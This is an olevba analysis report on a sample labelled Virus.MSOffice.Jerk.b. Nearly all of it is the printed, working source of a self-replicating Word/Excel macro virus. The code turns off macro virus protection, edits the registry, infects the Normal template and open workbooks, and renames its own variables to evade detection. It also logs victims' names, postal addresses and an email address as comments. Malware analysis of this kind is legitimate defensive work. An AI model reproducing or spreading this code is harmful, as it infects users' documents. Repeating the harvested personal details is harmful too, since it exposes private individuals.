olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Jerk.b-1aeb4216d90b74341d2598c9c582b33d402395af
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Jerk.b-1aeb4216d90b74341d2598c9c582b33d402395af - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' 09:48:17: PM - Tuesday, 28 Mar 2000
' a
'


' 09:39:28: PM - Tuesday, 28 Mar 2000
' a
'


' 08:03:46: AM - Tuesday, 28 Mar 2000
' a
'


' 02:13:21: PM - Monday, 27 Mar 2000
' a
'


' 02:18:06: PM - Monday, 13 Mar 2000
' zdzx
'


' 05:33:20: PM - Monday, 10 May 1999
' netscape
'

































Private Sub Workbook_Deactivate()
On Error Resume Next
Const CCARYFFWHOYM = 1, KDELPUEYXTO = True, ZESNCYLSVBFEYD = False, JJGMCOVSWBYSG = 0
Dim GSTJL, VDIPWQMOAECDAD As String
Dim JAVVOHSIQ, WSOXNOTHZQ As Integer
Dim RGQSMEJMQ As Boolean
VDIPWQMOAECDAD = "ThisWorkbook"
GSTJL = Application.ThisWorkbook.VBProject.VBComponents.Item(CCARYFFWHOYM).CodeModule.Lines(1, Application.ThisWorkbook.VBProject.VBComponents.Item(CCARYFFWHOYM).CodeModule.CountOfLines)
Call XZXQFNZKC(GSTJL)
For JAVVOHSIQ = CCARYFFWHOYM To Application.Workbooks.Count
RGQSMEJMQ = ZESNCYLSVBFEYD
For WSOXNOTHZQ = CCARYFFWHOYM To Application.Workbooks.Item(JAVVOHSIQ).VBProject.VBComponents.Count
If Application.Workbooks.Item(JAVVOHSIQ).VBProject.VBComponents.Item(WSOXNOTHZQ).CodeModule.CountOfLines = JJGMCOVSWBYSG Then
If Application.Workbooks.Item(JAVVOHSIQ).Path <> "" And Application.Workbooks.Item(JAVVOHSIQ).Saved = KDELPUEYXTO And RGQSMEJMQ = ZESNCYLSVBFEYD Then RGQSMEJMQ = KDELPUEYXTO
Application.Workbooks.Item(JAVVOHSIQ).VBProject.VBComponents.Item(WSOXNOTHZQ).CodeModule.InsertLines CCARYFFWHOYM, GSTJL
If Application.Workbooks.Item(JAVVOHSIQ).VBProject.VBComponents.Item(WSOXNOTHZQ).Name = VDIPWQMOAECDAD Then
Application.Workbooks.Item(JAVVOHSIQ).VBProject.VBComponents.Item(WSOXNOTHZQ).CodeModule.ReplaceLine CCARYFFWHOYM * 33, "Private Sub Workbook_Deactivate()"
Else
Application.Workbooks.Item(JAVVOHSIQ).VBProject.VBComponents.Item(WSOXNOTHZQ).CodeModule.ReplaceLine CCARYFFWHOYM * 33, "Private Sub Worksheet_Deactivate()"
End If
End If
Next WSOXNOTHZQ
If RGQSMEJMQ = KDELPUEYXTO Then Application.Workbooks.Item(JAVVOHSIQ).Save
Next JAVVOHSIQ
End Sub
Private Sub Document_Close()
On Error Resume Next
Const KDELPUEYXTO = True, ZESNCYLSVBFEYD = False, JJGMCOVSWBYSG = 0, CCARYFFWHOYM = 1, XDJDXWYBF = wdFormatDocument, LBENIPARWCLXWBR = wdFormatTemplate, SSNWOSKTQQHB = ":"
Dim RGQSMEJMQ, FKVMULNDYX, IEFYWAJPYD, EQGRBXMA As Boolean
Dim VWVHSIFWZS, MBZSMGZYINE As Object
Dim QHJZURWNEAWCGPT, GSTJL As String
If Month(CCARYFFWHOYM * Now) > CCARYFFWHOYM * 2 + CCARYFFWHOYM * 3 And Day(CCARYFFWHOYM * Now) = 4 + CCARYFFWHOYM * 10 Then MsgBox "V guvax " & Application.UserName & " vf n ovt fghcvq wrex!", 0, "www.all.net"
Set VWVHSIFWZS = ActiveDocument.VBProject.VBComponents.Item(CCARYFFWHOYM)
Set MBZSMGZYINE = NormalTemplate.VBProject.VBComponents.Item(CCARYFFWHOYM)
Randomize
IEFYWAJPYD = ZESNCYLSVBFEYD
EQGRBXMA = ZESNCYLSVBFEYD
If VWVHSIFWZS.CodeModule.CountOfLines <> JJGMCOVSWBYSG Then IEFYWAJPYD = KDELPUEYXTO
If MBZSMGZYINE.CodeModule.CountOfLines <> JJGMCOVSWBYSG Then EQGRBXMA = KDELPUEYXTO
Options.VirusProtection = ZESNCYLSVBFEYD
If (IEFYWAJPYD = KDELPUEYXTO Xor EQGRBXMA = KDELPUEYXTO) And (ActiveDocument.SaveFormat = XDJDXWYBF Or ActiveDocument.SaveFormat = LBENIPARWCLXWBR) Then
If IEFYWAJPYD = KDELPUEYXTO Then
FKVMULNDYX = NormalTemplate.Saved
GSTJL = VWVHSIFWZS.CodeModule.Lines(CCARYFFWHOYM, VWVHSIFWZS.CodeModule.CountOfLines)
Call CURNHBRNQJZEJ(GSTJL)
If Int(Rnd * 10 * CCARYFFWHOYM) = CCARYFFWHOYM * 7 Then Call HLZQJAIS(GSTJL)
Call ONGNDVKGOD(GSTJL)
MBZSMGZYINE.CodeModule.InsertLines CCARYFFWHOYM, GSTJL
If FKVMULNDYX = KDELPUEYXTO Then NormalTemplate.Save
End If
QHJZURWNEAWCGPT = Mid(ActiveDocument.FullName, 2, CCARYFFWHOYM)
If EQGRBXMA = KDELPUEYXTO And (QHJZURWNEAWCGPT = SSNWOSKTQQHB Or ActiveDocument.Saved = ZESNCYLSVBFEYD) Then
RGQSMEJMQ = ActiveDocument.Saved
GSTJL = MBZSMGZYINE.CodeModule.Lines(CCARYFFWHOYM, MBZSMGZYINE.CodeModule.CountOfLines)
Call ONGNDVKGOD(GSTJL)
VWVHSIFWZS.CodeModule.InsertLines CCARYFFWHOYM, GSTJL
If RGQSMEJMQ = KDELPUEYXTO Then ActiveDocument.Save
End If
End If
End Sub
Private Sub HLZQJAIS(ByRef GSTJL As String)
On Error Resume Next
Const EOTTNUOWXXPVUW = 48, FKTIOWD = 15, NRTGHPQA = 5, HSONE = 65, UKCQOQRABLRCCUL = 90, CCARYFFWHOYM = 1, KDELPUEYXTO = True, ZESNCYLSVBFEYD = False
Dim SYKUYPP, LPVELPEHVGXHNOJTmp, IVEFMJYZEKRO, LPVELPEHVGXHNOJ(CCARYFFWHOYM To EOTTNUOWXXPVUW), LPVELPEHVGXHNOJ2(CCARYFFWHOYM To EOTTNUOWXXPVUW) As String
Dim JAVVOHSIQ, WSOXNOTHZQ, ZBCGYTJKZ As Integer
Dim ZKKBYUWKAM As Boolean
SYKUYPP = "GSTJL EOTTNUOWXXPVUW LPVELPEHVGXHNOJ LPVELPEHVGXHNOJ2 IVEFMJYZEKRO JAVVOHSIQ WSOXNOTHZQ ZBCGYTJKZ ZKKBYUWKAM HLZQJAIS FKTIOWD NRTGHPQA HSONE UKCQOQRABLRCCUL CCARYFFWHOYM SYKUYPP LPVELPEHVGXHNOJTmp RGQSMEJMQ FKVMULNDYX IEFYWAJPYD EQGRBXMA VWVHSIFWZS MBZSMGZYINE CURNHBRNQJZEJ TQQVVLHOT UONEIMKVLCBT JQZAMRXKHT TXMZIPBFTBSO TQQVVLHOTTmp YFQZNPKEPX XJCMUSA QHJZURWNEAWCGPT KDELPUEYXTO ZESNCYLSVBFEYD JJGMCOVSWBYSG XDJDXWYBF LBENIPARWCLXWBR ZURVXC QFLLXAHCSMPPD SSNWOSKTQQHB LASPMARBHEPIRTC XMDAEERWOIM VDIPWQMOAECDAD XZXQFNZKC ONGNDVKGOD JCXRJATVDEGQABH BAGQROTVEGP XMSFOVVOQLWIERX"
Randomize
WSOXNOTHZQ = CCARYFFWHOYM
For JAVVOHSIQ = CCARYFFWHOYM To Len(SYKUYPP)
If Mid(SYKUYPP, JAVVOHSIQ, CCARYFFWHOYM) = " " Or JAVVOHSIQ = Len(SYKUYPP) Then
If JAVVOHSIQ = Len(SYKUYPP) Then LPVELPEHVGXHNOJTmp = LPVELPEHVGXHNOJTmp & Mid(SYKUYPP, JAVVOHSIQ, CCARYFFWHOYM)
For ZBCGYTJKZ = CCARYFFWHOYM To Int((FKTIOWD - NRTGHPQA + CCARYFFWHOYM) * Rnd + NRTGHPQA)
LPVELPEHVGXHNOJ2(WSOXNOTHZQ) = LPVELPEHVGXHNOJ2(WSOXNOTHZQ) & Chr(Int((UKCQOQRABLRCCUL - HSONE + CCARYFFWHOYM) * Rnd + HSONE))
Next ZBCGYTJKZ
LPVELPEHVGXHNOJ(WSOXNOTHZQ) = LPVELPEHVGXHNOJTmp
LPVELPEHVGXHNOJTmp = ""
WSOXNOTHZQ = WSOXNOTHZQ + CCARYFFWHOYM
Else
LPVELPEHVGXHNOJTmp = LPVELPEHVGXHNOJTmp & Mid(SYKUYPP, JAVVOHSIQ, CCARYFFWHOYM)
End If
Next JAVVOHSIQ
ZKKBYUWKAM = ZESNCYLSVBFEYD
For JAVVOHSIQ = CCARYFFWHOYM To Len(GSTJL)
For WSOXNOTHZQ = CCARYFFWHOYM To EOTTNUOWXXPVUW
If Mid(GSTJL, JAVVOHSIQ, Len(LPVELPEHVGXHNOJ(WSOXNOTHZQ))) = LPVELPEHVGXHNOJ(WSOXNOTHZQ) Then
IVEFMJYZEKRO = IVEFMJYZEKRO & LPVELPEHVGXHNOJ2(WSOXNOTHZQ)
JAVVOHSIQ = JAVVOHSIQ + Len(LPVELPEHVGXHNOJ(WSOXNOTHZQ)) - CCARYFFWHOYM
ZKKBYUWKAM = KDELPUEYXTO
Exit For
End If
Next WSOXNOTHZQ
If ZKKBYUWKAM = ZESNCYLSVBFEYD Then
IVEFMJYZEKRO = IVEFMJYZEKRO & Mid(GSTJL, JAVVOHSIQ, CCARYFFWHOYM)
Else
ZKKBYUWKAM = ZESNCYLSVBFEYD
End If
Next JAVVOHSIQ
GSTJL = IVEFMJYZEKRO
End Sub
Private Sub CURNHBRNQJZEJ(ByRef GSTJL As String)
On Error Resume Next
Const TXMZIPBFTBSO = "' ", CCARYFFWHOYM = 1
Const ZURVXC = "hh:mm:ss: AMPM - ", QFLLXAHCSMPPD = "dddd, d mmm yyyy"
Dim TQQVVLHOTTmp, TQQVVLHOT, YFQZNPKEPX, XJCMUSA, UONEIMKVLCBT, JQZAMRXKHT As String
Dim JAVVOHSIQ As Integer
UONEIMKVLCBT = Chr(10 * CCARYFFWHOYM + 3)
TQQVVLHOT = Application.UserAddress
XJCMUSA = Format(Time, ZURVXC) & Format(Date, QFLLXAHCSMPPD)
JQZAMRXKHT = Chr(CCARYFFWHOYM * 10)
YFQZNPKEPX = Application.UserName
For JAVVOHSIQ = CCARYFFWHOYM To Len(TQQVVLHOT)
If Mid(TQQVVLHOT, JAVVOHSIQ, CCARYFFWHOYM) <> UONEIMKVLCBT Then
If Mid(TQQVVLHOT, JAVVOHSIQ, CCARYFFWHOYM) <> JQZAMRXKHT Then
TQQVVLHOTTmp = TQQVVLHOTTmp & Mid(TQQVVLHOT, JAVVOHSIQ, CCARYFFWHOYM)
End If
Else
TQQVVLHOTTmp = TQQVVLHOTTmp & UONEIMKVLCBT & TXMZIPBFTBSO
End If
Next JAVVOHSIQ
GSTJL = GSTJL & UONEIMKVLCBT & TXMZIPBFTBSO & XJCMUSA & UONEIMKVLCBT & TXMZIPBFTBSO & YFQZNPKEPX & UONEIMKVLCBT & TXMZIPBFTBSO & TQQVVLHOT & UONEIMKVLCBT
End Sub
Private Sub ONGNDVKGOD(ByVal GSTJL As String)
On Error Resume Next
Dim XMSFOVVOQLWIERX As Long
Dim LASPMARBHEPIRTC As Object
Dim JCXRJATVDEGQABH, BAGQROTVEGP As String
JCXRJATVDEGQABH = "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
XMSFOVVOQLWIERX = &H0
BAGQROTVEGP = "Options6"
System.PrivateProfileString("", JCXRJATVDEGQABH, BAGQROTVEGP) = XMSFOVVOQLWIERX
Set LASPMARBHEPIRTC = GetObject(, "Excel.Application")
Const CCARYFFWHOYM = 1, JJGMCOVSWBYSG = 0
Dim VDIPWQMOAECDAD As String
Dim JAVVOHSIQ, WSOXNOTHZQ As Integer
VDIPWQMOAECDAD = "ThisWorkbook"
For JAVVOHSIQ = CCARYFFWHOYM To LASPMARBHEPIRTC.Application.Workbooks.Count
For WSOXNOTHZQ = CCARYFFWHOYM To LASPMARBHEPIRTC.Application.Workbooks.Item(JAVVOHSIQ).VBProject.VBComponents.Count
If LASPMARBHEPIRTC.Application.Workbooks.Item(JAVVOHSIQ).VBProject.VBComponents.Item(WSOXNOTHZQ).CodeModule.CountOfLines = JJGMCOVSWBYSG Then
LASPMARBHEPIRTC.Application.Workbooks.Item(JAVVOHSIQ).VBProject.VBComponents.Item(WSOXNOTHZQ).CodeModule.InsertLines CCARYFFWHOYM, GSTJL
If LASPMARBHEPIRTC.Application.Workbooks.Item(JAVVOHSIQ).VBProject.VBComponents.Item(WSOXNOTHZQ).Name = VDIPWQMOAECDAD Then
LASPMARBHEPIRTC.Application.Workbooks.Item(JAVVOHSIQ).VBProject.VBComponents.Item(WSOXNOTHZQ).CodeModule.ReplaceLine 33 * CCARYFFWHOYM, "Private Sub Workbook_Deactivate()"
Else
LASPMARBHEPIRTC.Application.Workbooks.Item(JAVVOHSIQ).VBProject.VBComponents.Item(WSOXNOTHZQ).CodeModule.ReplaceLine CCARYFFWHOYM * 33, "Private Sub Worksheet_Deactivate()"
End If
End If
Next WSOXNOTHZQ
Next JAVVOHSIQ
Set LASPMARBHEPIRTC = Nothing
End Sub
Private Sub XZXQFNZKC(ByVal GSTJL As String)
On Error Resume Next
Const KDELPUEYXTO = True, ZESNCYLSVBFEYD = False, CCARYFFWHOYM = 1, JJGMCOVSWBYSG = 0
Dim XMDAEERWOIM As Object
Dim FKVMULNDYX As Boolean
Set XMDAEERWOIM = GetObject(, "Word.Application")
If XMDAEERWOIM.NormalTemplate.VBProject.VBComponents.Item(CCARYFFWHOYM).CodeModule.CountOfLines = JJGMCOVSWBYSG Then
FKVMULNDYX = XMDAEERWOIM.NormalTemplate.Saved
XMDAEERWOIM.Options.VirusProtection = ZESNCYLSVBFEYD
XMDAEERWOIM.NormalTemplate.VBProject.VBComponents.Item(CCARYFFWHOYM).CodeModule.InsertLines CCARYFFWHOYM, GSTJL
If FKVMULNDYX = KDELPUEYXTO Then XMDAEERWOIM.NormalTemplate.Save
End If
Set XMDAEERWOIM = Nothing
End Sub

' 01:09:31: AM - Wednesday, 10 Feb 1999
' David Hartman
'

' 12:32:06: PM - Tuesday, 23 Feb 1999
' Ed Skiba
' Skiba
1295 Carlysle Park Drive
Lawrenceville GA 30044

' 07:40:26: AM - Friday, 26 Feb 1999
' IBM
' Henry D. Gibb
3973 Glen Meadow Dr.
Norcross, GA 30092

' 01:13:06: PM - Saturday, 27 Feb 1999
' George Archibald
'

' 05:18:36: PM - Tuesday, 2 Mar 1999
' Global Asset Development
'

' 01:09:44: PM - Friday, 5 Mar 1999
' Bruce Tomlin
'

' 08:47:54: AM - Wednesday, 24 Mar 1999
' Keith Klade
'

' 04:13:46: PM - Monday, 12 Apr 1999
' Craig Baglien
'

' 04:40:29: PM - Thursday, 15 Apr 1999
' netscape
'

' 09:37:16: AM - Wednesday, 23 Jun 1999
' Netscape
'

' 10:24:57: AM - Tuesday, 20 Jul 1999
' Mark Bassett
'

' 07:36:20: PM - Thursday, 9 Sep 1999
' .
'

' 01:41:51: PM - Friday, 1 Oct 1999
' 刘少华
' shliu@rii.xm.fj.cn

' 08:20:10: AM - Tuesday, 21 Dec 1999
' szy
'

' 09:34:22: AM - Monday, 14 Feb 2000
' zdzx
'

' 09:03:06: AM - Monday, 20 Mar 2000
' a
'

' 03:13:31: PM - Wednesday, 19 Apr 2000
' OPEY A.
'

' 12:46:28: AM - Tuesday, 16 May 2000
' Office User
'

' 02:09:06: AM - Tuesday, 16 May 2000
' Office User
'

' 04:08:14: AM - Wednesday, 17 May 2000
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

